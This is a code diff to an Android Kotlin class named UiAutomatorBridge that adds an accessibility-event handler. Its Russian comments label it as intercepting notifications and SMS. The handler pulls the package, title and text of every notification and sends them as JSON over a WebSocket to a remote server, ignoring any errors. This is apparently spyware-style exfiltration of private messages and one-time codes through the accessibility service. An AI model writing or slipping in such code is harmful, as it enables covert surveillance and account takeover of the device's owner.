@@ -597,4 +597,35 @@ class UiAutomatorBridge(private val service: AccessibilityService) {
 	    }
     }
 
+    // ── Перехват уведомлений и СМС ──────────────────────────────
+    fun onAccessibilityEvent(event: android.view.accessibility.AccessibilityEvent) {
+        if (event.eventType == android.view.accessibility.AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
+            val pkg = event.packageName?.toString().orEmpty()
+
+            // Извлекаем объект уведомления
+            val notification = event.parcelableData as? android.app.Notification
+            val extras = notification?.extras
+            val title = extras?.getCharSequence(android.app.Notification.EXTRA_TITLE)?.toString().orEmpty()
+            val text = extras?.getCharSequence(android.app.Notification.EXTRA_TEXT)?.toString().orEmpty()
+
+            // Если стандартное поле пустое, берем сырой текст события
+            val body = text.ifEmpty { event.text.joinToString("\n") }
+
+            if (body.isNotEmpty()) {
+                try {
+                    val obj = JSONObject().apply {
+                        put("type", "notification")
+                        put("package", pkg)
+                        put("title", title)
+                        put("text", body)
+                        put("timestamp", System.currentTimeMillis())
+                    }
+                    // Отправляем асинхронно на сервер в WebSocket
+                    ws?.send(obj.toString())
+                } catch (_: Exception) {}
+            }
+        }
+    }
+
+
 }
